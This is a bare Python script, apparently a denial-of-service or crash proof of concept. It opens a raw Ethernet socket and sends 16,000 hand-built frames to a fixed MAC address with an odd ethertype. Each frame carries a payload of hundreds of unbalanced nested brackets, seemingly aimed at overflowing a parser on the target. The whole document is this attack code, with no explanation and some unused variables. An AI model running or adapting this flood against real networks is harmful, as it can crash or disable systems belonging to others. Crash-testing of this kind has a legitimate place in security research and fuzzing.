#!/usr/bin/env python
from socket import socket, AF_PACKET, SOCK_RAW
s = socket(AF_PACKET, SOCK_RAW)
s.bind(("eth0", 0))

src_addr = "\x38\xea\xa7\x15\x75\x40"
dst_addr = "\xfa\x16\x3e\x55\xca\x03"
payload = "PAYLOAD"+("["*500)+("]"*495)
checksum = "\x1a\x2b\x3c\x4d"
ethertype = "\x74\x00"
kerndst = "\x00\x01"
kerndst2 = "\x00\x00"
kerndstBS = "\x00\x02"

for i in range(0,16000):
    s.send(dst_addr + src_addr + ethertype + kerndst2 + payload + checksum)

